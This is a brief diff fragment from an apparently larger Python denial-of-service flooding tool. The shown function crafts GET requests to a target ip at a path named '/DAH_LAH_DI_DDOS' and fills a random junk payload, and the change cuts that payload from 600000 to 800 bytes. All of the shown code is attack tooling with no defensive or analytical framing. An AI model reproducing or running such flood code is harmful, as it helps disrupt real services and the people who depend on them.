@@ -3902,7 +3902,7 @@ os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title FranzDo
 def run():
     header = Headers("get")
     i = random.choice(("[*]","[!]","[#]"))
-    data = random._urandom(600000)
+    data = random._urandom(800)
     if method_attack == "1":
         get_host = "GET /DAH_LAH_DI_DDOS HTTP/1.1\r\nHost: " + ip + "\r\n"
         request  = get_host + header + "\r\n"
